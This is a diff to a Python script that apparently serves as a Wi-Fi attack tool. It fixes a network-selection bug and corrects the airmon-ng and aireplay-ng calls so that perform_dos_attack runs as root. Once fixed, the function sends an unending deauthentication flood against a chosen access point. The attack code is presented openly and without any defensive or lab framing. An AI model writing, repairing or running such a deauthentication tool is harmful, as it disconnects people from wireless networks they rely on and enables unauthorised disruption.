@@ -158,8 +158,8 @@ def set_target_network():
     while True:
         try:
             selection = int(input("Please select a choice: "))
-            if active_wifi_connections[set_target_network]:
-                return active_wifi_connections[set_target_network]
+            if active_wifi_connections[selection]:
+                return active_wifi_connections[selection]
         except (ValueError, IndexError):
             print("Invalid choice, please try again. ")
 # Now, we must choose a network to perform the attack 
@@ -168,9 +168,9 @@ def set_target_network():
 
 def perform_dos_attack(interface, target_bssid, channel):
     logging.info(f"Switching {interface} to channel{channel} for DoS attack")
-    run_command(["airmon-ng, start, f{interface}mon", channel])
+    run_command(["sudo", "airmon-ng", "start", f"{interface}mon", channel])
     logging.info(f"Starting DoS attack on {target_bssid}")
-    run_command(["aireplay-ng", "--deauth", "0", "-a", target_bssid, f"{interface}mon"])
+    run_command(["sudo", "aireplay-ng", "--deauth", "0", "-a", target_bssid, f"{interface}mon"])
 # This function performs the attack which takes into account 3 parameter including interface "wlan0mon", target_BSSID "Mac Address", and channel "1,6,11"
 # We log an info message stating we are switching interface to target network's channel
 # Run command to verify if airmon-ng start command switches to interface of targeted network's channel("mon" = monitor mode)
